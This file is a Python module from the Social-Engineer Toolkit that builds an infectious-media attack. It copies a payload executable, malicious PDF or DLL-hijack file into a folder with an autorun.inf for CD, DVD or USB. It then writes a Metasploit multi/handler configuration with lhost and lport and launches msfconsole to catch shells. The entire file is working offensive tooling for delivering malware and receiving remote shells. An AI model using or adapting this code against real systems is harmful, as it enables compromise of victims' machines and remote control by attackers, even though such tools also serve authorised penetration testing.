#!/usr/bin/env python
# simple autorun creation for set

import subprocess
import os
import re
import sys
from src.core.setcore import *
from time import sleep

# define metasploit path
definepath = os.getcwd()
msf_path = meta_path()
me = mod_name()

trigger = 0
if check_options("INFECTION_MEDIA=") == "ON":
#if os.path.isfile(setdir + "/standardpayload.file"):
    trigger = 1
    subprocess.Popen("rm -rf %s/autorun/ 1> /dev/null 2> /dev/null;mkdir %s/autorun 1> /dev/null 2> /dev/null;cp %s/payload.exe %s/autorun/program.exe 1> /dev/null 2> /dev/null" % (setdir,setdir,setdir,setdir), shell=True).wait()

if os.path.isfile(setdir + "/fileformat.file"):
    trigger = 2
    subprocess.Popen("rm -rf %s/autorun/ 1> /dev/null 2> /dev/null;mkdir autorun 1> /dev/null 2> /dev/null;cp %s/template.pdf autorun/ 1> /dev/null 2>/dev/null" % (setdir,setdir), shell=True).wait()

if os.path.isfile(setdir + "/dll/openthis.wab"):
    subprocess.Popen("rm -rf %s/autorun/ 1> /dev/null 2> /dev/null;mkdir autorun 1> /dev/null 2> /dev/null;cp %s/dll/* autorun/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
    trigger = 3

if not os.path.isdir(setdir + "/autorun"): os.makedirs (setdir + "/autorun/")
filewrite = file(setdir + "/autorun/autorun.inf", "w")

# if using standard payloads
if trigger == 1:
    payload = "program.exe" #"" + alpha_data + "\""

# if using pdf payload
if trigger == 2:
    payload = "template.pdf"

if trigger == 3:
    payload = "openthis.wab"

filewrite.write("""[autorun]
open=%s
icon=autorun.ico""" % (payload))
filewrite.close()
print_status("Your attack has been created in the SET home directory (/root/.set/) folder 'autorun'")
print_status("Note a backup copy of template.pdf is also in /root/.set/template.pdf if needed.")
print_info("Copy the contents of the folder to a CD/DVD/USB to autorun")

# if we want to launch payload and automatically create listener
if trigger == 1 or trigger == 2 or trigger == 3:
    choice1 = yesno_prompt("0", "Create a listener right now [yes|no]")
    if choice1.lower() == "yes" or choice1.lower() == "y":
	# if we used something to create other than solo.py then write out the listener
	if not os.path.isfile(setdir + "/meta_config"): 	       
		filewrite = file(setdir + "/meta_config", "w")
	        fileopen = file(setdir + "/payload.options", "r")
	        for line in fileopen:
	            line = line.split(" ")
	            filewrite.write("use multi/handler\n")
	            filewrite.write("set payload " + line[0] + "\n")
	            filewrite.write("set lhost " + line[1] + "\n")
	            filewrite.write("set lport " + line[2] + "\n")
	            filewrite.write("set ExitOnSession false\n")
	            filewrite.write("exploit -j\r\n\r\n")
	            filewrite.close()

	# create the listener
	print_status("Launching Metasploit.. This could take a few. Be patient! Or else no shells for you..")
        subprocess.Popen("%smsfconsole -r %s/meta_config" % (msf_path, setdir), shell=True).wait()
    else:
        print_warning("cancelling...")
        sleep (2)
